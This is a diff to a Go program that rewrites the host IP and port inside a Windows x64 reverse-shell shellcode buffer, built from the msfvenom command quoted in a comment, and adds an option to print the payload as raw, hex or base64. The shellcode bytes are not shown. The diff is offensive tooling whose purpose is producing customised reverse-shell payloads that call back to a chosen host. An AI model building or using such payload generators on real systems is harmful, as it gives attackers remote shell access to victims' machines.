@@ -1,7 +1,9 @@
 package main
 
 import (
+	"encoding/base64"
 	"encoding/binary"
+	"encoding/hex"
 	"flag"
 	"fmt"
 	"strconv"
@@ -13,6 +15,7 @@ var (
 	offsetIPv4 = 234
 	host       string
 	port       int
+	format     string
 )
 
 func replacePortInBuffer(buf []byte, port int) error {
@@ -66,6 +69,7 @@ func parseIPv4(ipStr string) ([4]byte, error) {
 func main() {
 	flag.StringVar(&host, "host", "127.0.0.1", "Host IP address")
 	flag.IntVar(&port, "port", 4444, "Port number (0-65535)")
+	flag.StringVar(&format, "format", "raw", "Format: {raw, hex, base64}")
 	flag.Parse()
 
 	// msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -f go
@@ -128,5 +132,12 @@ func main() {
 		return
 	}
 
-	fmt.Println(string(buf))
+	switch format {
+	case "hex":
+		fmt.Println(hex.EncodeToString(buf))
+	case "base64":
+		fmt.Println(base64.StdEncoding.EncodeToString(buf))
+	default:
+		fmt.Println(string(buf))
+	}
 }
